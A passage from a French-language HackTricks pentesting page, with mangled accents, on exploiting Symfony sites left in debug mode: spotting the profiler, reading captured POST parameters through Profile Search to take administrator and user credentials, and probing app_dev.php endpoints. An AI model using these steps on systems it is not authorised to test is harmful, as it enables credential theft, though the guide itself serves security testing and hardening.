![8](https://www.ambionics.io/images/symfony-secret-fragment/8.png)

L'exploit va donc parcourir toutes les combinaisons de variables possibles, puis essayer les deux m√©thodes d'exploitation. Le code est disponible sur [notre GitHub](https://github.com/ambionics/symfony-exploits).

## Acc√®s aux informations symfony /\_profiler

![f:id:flattsecurity:20201021204553p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204553.png)

Comme vous pouvez le voir sur la capture d'√©cran ci-dessus, il y a un logo `sf` en bas √† droite de la page. Ce logo est affich√© lorsque Symfony est en mode d√©bogage. Il y a des cas o√π ce logo ne s'affiche pas, alors essayez d'acc√©der √† `/_profiler` et vous verrez la page comme indiqu√© ci-dessous.

![f:id:flattsecurity:20201021204605p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204605.png)

Cette fonctionnalit√© s'appelle Symfony Profiler, et il n'y a pas beaucoup d'informations √† ce sujet sur Internet. L'intention de cette fonctionnalit√© est tr√®s claire ; elle vous aide √† d√©boguer lorsqu'il y a une erreur ou un bogue. Bien s√ªr, cette fonctionnalit√© ne peut √™tre utilis√©e que lorsque le mode d√©bogage est activ√©.

Le framework Symfony lui-m√™me est tr√®s s√©curis√©, mais l'activation du mode d√©bogage rendra ce framework extr√™mement vuln√©rable. Par exemple, Profiler a une fonctionnalit√© appel√©e Profile Search, comme le montre la capture d'√©cran suivante.

![f:id:flattsecurity:20201021204624p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204624.png)

Comme vous pouvez le voir sur la capture d'√©cran ci-dessus, vous pouvez acc√©der √† toutes les demandes envoy√©es au serveur. En cliquant sur les hachages dans le jeton, vous verrez que tous les param√®tres POST peuvent √™tre lus, comme on le voit sur la capture d'√©cran suivante. Avec cette fonctionnalit√©, nous pouvons pirater les identifiants du compte de l'administrateur et de l'utilisateur.

![f:id:flattsecurity:20201021204637p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204637.png)

### Autres points d'extr√©mit√© activ√©s par le d√©bogage

Vous devriez √©galement v√©rifier ces URL :

* **https://example.com/app\_dev.php/\_profiler**
* **https://example.com/app\_dev.php**\\

## R√©f√©rences

* [**https://www.ambionics.io/blog/symfony-secret-fragment**](https://www.ambionics.io/blog/symfony-secret-fragment)
* [**https://flattsecurity.hatenablog.com/entry/2020/11/02/124807**](https://flattsecurity.hatenablog.com/entry/2020/11/02/124807)
* [**https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144**](https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
